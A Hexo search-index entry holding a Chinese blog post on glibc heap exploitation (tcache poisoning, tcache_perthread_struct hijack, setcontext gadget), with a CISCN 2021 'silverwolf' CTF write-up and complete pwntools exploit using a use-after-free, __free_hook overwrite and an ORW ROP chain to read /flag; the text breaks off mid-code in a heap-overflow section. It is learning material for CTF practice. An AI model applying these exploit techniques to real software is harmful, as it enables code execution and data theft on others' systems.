<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>堆知识总结</title>
      <link href="/2024/12/07/%E5%A0%86%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2024/12/07/%E5%A0%86%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><h5 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="各种利用"><a href="#各种利用" class="headerlink" title="各种利用"></a>各种利用</h3><h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>glibc2.32 开始加入 Safe linking 机制，tcache 的 next 指针加密，需要先泄露堆地址绕过。新版本增加对齐检查。</p><h5 id="Tcachebin-的组织形式"><a href="#Tcachebin-的组织形式" class="headerlink" title="Tcachebin 的组织形式"></a>Tcachebin 的组织形式</h5><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241101114734825.png" alt="image-20241101114734825"></p><p>注意，和 fastbin 相比还有一个较大的不同，那就是单向链表链接时是指向下一个 chunk 的 data 区域，而 fastbin 的单向链表指针指向的是下一个 free chunk 的 chunk 头。</p><p>Tcache 的组织形式非常简洁，如果我们利用 UAF 将某一块 free chunk 的 next 指针覆写为地址 target，那我们就可以将以 target 为数据区域开始的 fake chunk malloc 出来，从而进行读写操作。</p><p>因为是修改了 next 指针域，所以也被称为“毒化”，这就是 poisoning 这个名字的由来，非常直观。</p><h4 id="劫持-tcache-perthread-struct"><a href="#劫持-tcache-perthread-struct" class="headerlink" title="劫持 tcache_perthread_struct"></a>劫持 tcache_perthread_struct</h4><p> tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能，与 fast bin 类似。 tcache 引入了两个新的结构体， <code>tcache_entry </code>和<code> tcache_perthread_struct</code> 。 </p><p><code>tcache_entry </code>和 <code>tcache_perthread_struct</code> 定义如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>查看一下它的结构</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *a[<span class="number">7</span>];</span><br><span class="line"><span class="type">void</span> *b[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;  <span class="number">7</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">a[i] =  <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">b[i] = <span class="built_in">malloc</span>(<span class="number">0x228</span>);</span><br><span class="line"><span class="comment">/* code */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">free</span>(a[i]);</span><br><span class="line"><span class="built_in">free</span>(b[i]);</span><br><span class="line">&#125;</span><br><span class="line">read(<span class="number">0</span>,a[<span class="number">0</span>],<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241106163717958.png" alt="image-20241106163717958"></p><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241106163529465.png" alt="image-20241106163529465"></p><p>大小为 0x250（高版本为 0x290）。其中数据部分前 0x40 为counts ，剩下的为 entries 结构。如果能控制这个堆块就可以控制整个 tcache</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tcache is pointing to: <span class="number">0x555555559010</span> <span class="keyword">for</span> thread <span class="number">1</span></span><br><span class="line">&#123;</span><br><span class="line">  counts = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span> &lt;repeats <span class="number">30</span> times&gt;, <span class="number">7</span>, <span class="number">0</span> &lt;repeats <span class="number">30</span> times&gt;&#125;,</span><br><span class="line">  entries = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55555555a140</span>, <span class="number">0x0</span> &lt;repeats <span class="number">30</span> times&gt;, <span class="number">0x55555555a180</span>, <span class="number">0x0</span> &lt;repeats <span class="number">30</span> times&gt;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tcache_perthread_struct</code> 结构体存储了可以存放的最多tcache堆块数量、已释放的tcache堆块指针。<br> 通过劫持并修改这些，可以做到任意地址写。</p><h4 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h4><p><code>setcontext gadget</code></p><p><code>setcontext</code>函数是<code>libc</code>中一个独特的函数，它的功能是传入一个 <code>SigreturnFrame</code> 结构指针，然后根据 <code>SigreturnFrame</code> 的内容设置各种寄存器。 因此从 <code>setcontext+53</code>（不同 <code>libc</code> 偏移可能不同）的位置开始有如下 <code>gadget</code>，即根据 <code>rdi</code> 也就是第一个 参数指向的 <code>SigreturnFrame</code> 结构设置寄存器。 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffff7852085 &lt;setcontext+53&gt;     mov    rsp, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7ffff785208c &lt;setcontext+60&gt;     mov    rbx, qword ptr [rdi + 0x80]</span><br><span class="line">0x7ffff7852093 &lt;setcontext+67&gt;     mov    rbp, qword ptr [rdi + 0x78]</span><br><span class="line">0x7ffff7852097 &lt;setcontext+71&gt;     mov    r12, qword ptr [rdi + 0x48]</span><br><span class="line">0x7ffff785209b &lt;setcontext+75&gt;     mov    r13, qword ptr [rdi + 0x50]</span><br><span class="line">0x7ffff785209f &lt;setcontext+79&gt;     mov    r14, qword ptr [rdi + 0x58]</span><br><span class="line">0x7ffff78520a3 &lt;setcontext+83&gt;     mov    r15, qword ptr [rdi + 0x60]</span><br><span class="line">0x7ffff78520a7 &lt;setcontext+87&gt;     mov    rcx, qword ptr [rdi + 0xa8]</span><br><span class="line">0x7ffff78520ae &lt;setcontext+94&gt;     push   rcx</span><br><span class="line">0x7ffff78520af &lt;setcontext+95&gt;     mov    rsi, qword ptr [rdi + 0x70]</span><br><span class="line">0x7ffff78520b3 &lt;setcontext+99&gt;     mov    rdx, qword ptr [rdi + 0x88]</span><br><span class="line">0x7ffff78520ba &lt;setcontext+106&gt;    mov    rcx, qword ptr [rdi + 0x98]</span><br><span class="line">0x7ffff78520c1 &lt;setcontext+113&gt;    mov    r8, qword ptr [rdi + 0x28]</span><br><span class="line">0x7ffff78520c5 &lt;setcontext+117&gt;    mov    r9, qword ptr [rdi + 0x30]</span><br><span class="line">0x7ffff78520c9 &lt;setcontext+121&gt;    mov    rdi, qword ptr [rdi + 0x68]</span><br><span class="line">0x7ffff78520cd &lt;setcontext+125&gt;    xor    eax, eax                            EAX =&gt; 0</span><br><span class="line">0x7ffff78520cf &lt;setcontext+127&gt;    ret   </span><br></pre></td></tr></table></figure><p>因此只需要设置 <code>rdi</code> 为 <code>SignatureFrame</code> 结构体指针，然后跳转到 外的寄存器设置成对应的值。<code> setcontext + 53</code> 就可以将除 <code>rax</code> 例如<code>__free_hook</code> 传入的参数是释放的内存的指针，因此可以通过将 <code>free hook</code> 写入 <code>setcontext gadget</code> 然后 <code>free</code> 一个存储 <code>SigreturnFrame</code> 结构的内存来设置寄存器，继而控制程序执行流程来执行<code> shellcode</code> 或进一步 <code>rop </code>。 </p><p>例题：[CISCN 2021 初赛]silverwolf</p><p>保护全开，还有沙箱</p><p>先看<code>add</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">allocate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_1144, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(&amp;unk_1144, &amp;size);</span><br><span class="line">    v1 = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        size_list = v1;</span><br><span class="line">        buf = v2;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该块，限制大小，且一次只能控制一个块，看delete函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; buf )</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有<code>uaf</code>漏洞，该题的<code>libc</code>为<code>2.27</code>，<code>tcache</code>没有安全机制，我们可以直接通过篡改来劫持程序执行，但是该题有沙箱，我们需要使用<code>orw</code>来获得<code>flag</code></p><p>首先泄露<code>heap_base</code>，因为<code>tcache</code>的数据起始存放下一个块的地址，所以我们直接用<code>uaf</code>漏洞来泄露。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = uu64(io.recv(<span class="number">6</span>)) - <span class="number">0x11b0</span></span><br><span class="line">leak(<span class="string">&quot;heap_addr&quot;</span>,heap_base)</span><br></pre></td></tr></table></figure><p>我们需要泄露<code>libc</code>地址，这里我们可以通过<code>tcache</code>结构的管理块，来泄露</p><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241207191231048.png" alt="image-20241207191231048"></p><p>可以看到<code>0x74</code>开头的，它们可以泄露<code>libc</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x0000000007000000</span>))</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = uu64(io.recv(<span class="number">6</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br></pre></td></tr></table></figure><p>然后我们要利用<code>setcontext</code>来执行<code>orw</code>的代码，我们首先篡改<code>free_hook</code>，指向<code>setcontext+53</code>，然后在<code>free</code>时，指向的块的<code>0xa0</code>处来劫持栈，还要劫持<code>rip</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">orw = p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw += p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax)+p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi)+p64(flag_addr)</span><br><span class="line">orw += p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(read)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi)+p64(flag_addr)</span><br><span class="line">orw += p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(write)</span><br></pre></td></tr></table></figure><p>这是要执行的代码，然后就是写入并执行</p><p>首先构造好我们需要的<code>tcache</code>结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27; * 0x40</span><br><span class="line">payload += p64(free_hook)#这里是0x20大小堆块的下一个堆块的指针，意味着我们再申请一个0x20大小的堆块就分配到了free_hook</span><br><span class="line">payload += p64(heap_base+0x2000)#在这里写入“./flag”</span><br><span class="line">payload += p64(heap_base+0x20A0)#rdi+0xa0这里布置的应该是需要劫持的栈地址</span><br><span class="line">payload += p64(heap_base+0x2000)#这里作为rdi去触发free_hook</span><br><span class="line">payload += p64(orw_addr+0x60) + p64(orw_addr)#0x60和0x70放我们的orw链，因为比较长所以需要放两个堆块</span><br><span class="line">payload += p64(0)</span><br><span class="line">edit(payload)#写入</span><br></pre></td></tr></table></figure><p>最后就是执行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">pl = p64(orw_addr) + p64(ret)</span><br><span class="line">edit(pl)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">delete()   </span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p>完整exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">duan</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">x64_32 = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> x64_32:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./silverwolf&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./silverwolf&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sl(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    sl(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sl(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sl(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    ru(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    sl(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = uu64(io.recv(<span class="number">6</span>)) - <span class="number">0x11b0</span></span><br><span class="line">leak(<span class="string">&quot;heap_addr&quot;</span>,heap_base)</span><br><span class="line"></span><br><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x0000000007000000</span>))</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = uu64(io.recv(<span class="number">6</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2164f</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x1b500</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23a6a</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> </span><br><span class="line">syscall = libc_base + <span class="number">0x2743</span></span><br><span class="line">ret = libc_base + <span class="number">0x8AA</span></span><br><span class="line"></span><br><span class="line">orw_addr = heap_base+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">payload += p64(free_hook)<span class="comment">#这里是0x20大小堆块的下一个堆块的指针，意味着我们再申请一个0x20大小的堆块就分配到了free_hook</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x2000</span>)<span class="comment">#这里是0x30大小堆块的下一个堆块的指针,这是作为rdi的堆块</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x20A0</span>)<span class="comment">#rdi+0xa0这里布置的应该是需要劫持的栈地址</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x2000</span>)<span class="comment">#0x50</span></span><br><span class="line">payload += p64(orw_addr+<span class="number">0x60</span>) + p64(orw_addr)<span class="comment">#0x60和0x70放我们的prw链，因为比较长所以需要放两个堆块</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">edit(payload)<span class="comment">#写入</span></span><br><span class="line"><span class="comment">#duan()</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw += p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax)+p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi)+p64(flag_addr)</span><br><span class="line">orw += p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(read)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi)+p64(flag_addr)</span><br><span class="line">orw += p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">pl = p64(orw_addr) + p64(ret)</span><br><span class="line">edit(pl)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">duan()</span><br><span class="line">delete()   </span><br><span class="line">itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h4><h5 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h5><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p><p>不难发现，堆溢出漏洞发生的基本前提是</p><ul><li>程序向堆上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。</p><p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， <code>bss</code> 段溢出等）。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 <code>EIP </code>。一般来说，我们利用堆溢出的策略是</p><ol><li>覆盖与其物理相邻的下一个 chunk的内容。<ul><li><code>prev_size</code></li><li>size，主要有三个比特位，以及该堆块真正的大小。<ul><li>NON_MAIN_ARENA </li><li>IS_MAPPED </li><li><code>PREV_INUSE</code> </li><li>the True chunk size</li></ul></li><li>chunk content，从而改变程序固有的执行流。</li></ul></li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li></ol><h5 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 